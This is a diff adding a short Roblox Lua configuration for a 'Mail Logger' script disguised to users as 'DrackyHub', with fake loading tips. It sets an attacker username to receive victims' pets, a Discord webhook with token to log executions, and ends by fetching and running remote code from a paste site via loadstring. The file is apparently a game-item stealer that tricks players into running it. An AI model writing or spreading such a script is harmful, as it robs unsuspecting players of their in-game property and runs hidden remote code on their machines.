@@ -1,0 +1,29 @@
+--[[ Hostee Scriptz Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "biel701070" --// Username To Send Pets To
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1114914969176260652/y_sOo0I9J0bi3WbXyxxD9VgdxLRuNt7TE9CaCCaxbsbhB2vM8ifd-eNZlQzMEd-8snHh" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+
+_G.ScripttName = "DrackyHub" --// Script Name On The UI
+
+_G.Tip1 = "Wait" --// Gives You Tips On The UI
+
+_G.Tip2 = "loading script" --// Gives You Tips On The UI
+
+_G.Tip3 = "injecting moon" --// Gives You Tips On The UI
+
+_G.Tip4 = "loading" --// Gives You Tips On The UI
+
+_G.Tip5 = "completing" --// Gives You Tips On The UI
+
+--[[ Script ]]
+
+loadstring(game:HttpGet("https://paste.xyzo.space/nxll/mail.lua"))()
